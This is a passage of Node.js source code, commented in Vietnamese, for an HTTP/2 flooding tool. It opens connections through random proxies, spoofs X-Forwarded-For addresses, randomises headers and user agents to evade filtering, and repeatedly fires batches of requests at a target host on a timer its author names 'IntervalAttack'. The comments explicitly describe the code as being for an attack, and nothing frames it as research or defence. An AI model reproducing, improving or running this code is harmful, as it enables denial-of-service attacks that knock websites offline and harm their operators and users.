            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    var uap1 = randomElement(uap); // Chọn User-Agent ngẫu nhiên từ mảng đã tinh chỉnh

    // Tạo headers hợp lệ và đa dạng hơn
    let generatedHeaders = headerGenerator.getHeaders({
        // Có thể thêm các tùy chọn để kiểm soát loại header được tạo
        // Ví dụ: ensure: { 'Accept-Encoding': 'gzip, deflate, br' }
    });

    // Khởi tạo headers với các giá trị mặc định từ HeaderGenerator
    const requestHeaders = {
        ...generatedHeaders, // Sao chép tất cả các header được tạo
        ":method": randomMethod,
        ":path": parsedTarget.path + randomElement(pathts), // Chỉ thêm path hợp lý
        ":scheme": "https",
        ":authority": parsedTarget.host,
        "user-agent": uap1, // Sử dụng User-Agent từ mảng uap đã tinh chỉnh
        "accept": randomElement(accept_header),
        "accept-language": randomElement(lang_header),
        "accept-encoding": randomElement(encoding_header),
        "cache-control": randomElement(controle_header),
        "pragma": randomElement(controle_header), // Pragma cũng là một dạng cache-control
        "referer": randomReferer, // Giữ referer
        "x-forwarded-for": fakeIP, // Giữ X-Forwarded-For
        // Loại bỏ các header không cần thiết hoặc bất thường
        // "x-download-options": generatedHeaders['x-download-options'], // Thường không cần thiết
        // "Cross-Origin-Embedder-Policy": generatedHeaders['Cross-Origin-Embedder-Policy'], // Thường là header phản hồi
        // "Cross-Origin-Opener-Policy": generatedHeaders['Cross-Origin-Opener-Policy'], // Thường là header phản hồi
        // "Referrer-Policy": generatedHeaders['Referrer-Policy'], // Thường là header phản hồi
        // "x-cache": generatedHeaders['x-cache'], // Thường là header phản hồi
        // "Content-Security-Policy": generatedHeaders['Content-Security-Policy'], // Thường là header phản hồi
        // "x-frame-options": generatedHeaders['x-frame-options'], // Thường là header phản hồi
        // "x-xss-protection": generatedHeaders['x-xss-protection'], // Thường là header phản hồi
        // "x-content-type-options": "nosniff", // Giữ lại nếu cần, nhưng không phải lúc nào cũng cần
        // "TE": "trailers", // Biến 'trailers' không được định nghĩa
        // "upgrade-insecure-requests": "1", // Có thể giữ lại
        // "sec-fetch-dest": generatedHeaders['sec-fetch-dest'],
        // "sec-fetch-mode": generatedHeaders['sec-fetch-mode'],
        // "sec-fetch-site": generatedHeaders['sec-fetch-site'],
        // "X-Forwarded-Proto": "https", // Đảm bảo giá trị là 'https'
        // "sec-ch-ua": generatedHeaders['sec-ch-ua'],
        // "sec-ch-ua-mobile": generatedHeaders['sec-ch-ua-mobile'],
        // "sec-ch-ua-platform": generatedHeaders['sec-ch-ua-platform'],
        // "vary": generatedHeaders['vary'], // Thường là header phản hồi
        // "x-requested-with": "XMLHttpRequest", // Chỉ khi là AJAX request
        // "set-cookie": generatedHeaders['set-cookie'], // Thường là header phản hồi
        // "Server": generatedHeaders['Server'], // Thường là header phản hồi
        // "strict-transport-security": generatedHeaders['strict-transport-security'], // Thường là header phản hồi
        // "access-control-allow-headers": generatedHeaders['access-control-allow-headers'], // Thường là header phản hồi
        // "access-control-allow-origin": generatedHeaders['access-control-allow-origin'], // Thường là header phản hồi
        // "Content-Encoding": generatedHeaders['Content-Encoding'], // Thường là header phản hồi
        // "alt-svc": generatedHeaders['alt-svc'], // Thường là header phản hồi
        // "Via": fakeIP, // Dấu hiệu của proxy
        // "sss": fakeIP, // Header không chuẩn
        // "Sec-Websocket-Key": fakeIP, // Chỉ khi là WebSocket
        // "Sec-Websocket-Version": 13, // Chỉ khi là WebSocket
        // "Upgrade": "websocket", // Chỉ khi là WebSocket
        // "X-Forwarded-Host": fakeIP, // Có thể giữ lại nếu muốn giả mạo host
        // "Client-IP": fakeIP, // Có thể giữ lại
        // "Real-IP": fakeIP, // Có thể giữ lại
    };

    // Thêm Content-Type nếu phương thức là POST
    if (randomMethod === "POST") {
        requestHeaders["content-type"] = "application/x-www-form-urlencoded"; // Hoặc application/json
        // Thêm body nếu cần
        // requestHeaders["content-length"] = Buffer.byteLength(body);
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 5000 // Tăng timeout cho proxy connection
    };

    setTimeout(function(){
        process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
        // console.error("Uncaught Exception:", er); // Ghi log lỗi để debug
    });
    process.on('unhandledRejection', function(er) {
        // console.error("Unhandled Rejection:", er); // Ghi log lỗi để debug
    });

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            // console.log(`Proxy connection error: ${error}`); // Ghi log lỗi proxy
            return;
        }

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            // challengesToSolve: Infinity, // Không cần thiết cho tấn công
            // resolveWithFullResponse: true, // Không cần thiết
            // followAllRedirects: true, // Không cần thiết
            // maxRedirects: 10, // Không cần thiết
            clientTimeout: 10000, // Tăng timeout cho client
            clientlareMaxTimeout: 15000, // Tăng timeout
            cloudflareTimeout: 10000, // Tăng timeout
            cloudflareMaxTimeout: 30000, // Tăng timeout
            ciphers: tls.getCiphers().join(":") + cipper, // Giữ nguyên
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"], // Giữ nguyên
            servername: parsedTarget.host, // Sử dụng parsedTarget.host
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL, // Bỏ crypto.constants.SSLcom nếu không cần
            sigals: concu, // Giữ nguyên
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448", // Giữ nguyên
            secure: true,
            Compression: false,
            rejectUnauthorized: false, // Giữ nguyên để bỏ qua lỗi chứng chỉ
            port: 443,
            uri: parsedTarget.host,
            sessionTimeout: 10000, // Tăng session timeout
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000, // Giữ nguyên hoặc tăng nhẹ
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000, // Giữ nguyên
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(requestHeaders) // Sử dụng requestHeaders đã tinh chỉnh
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return;
                    });
                    request.end();
                }
            }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            // console.log(`HTTP/2 client error: ${error}`); // Ghi log lỗi client
            return;
        });
    });
}
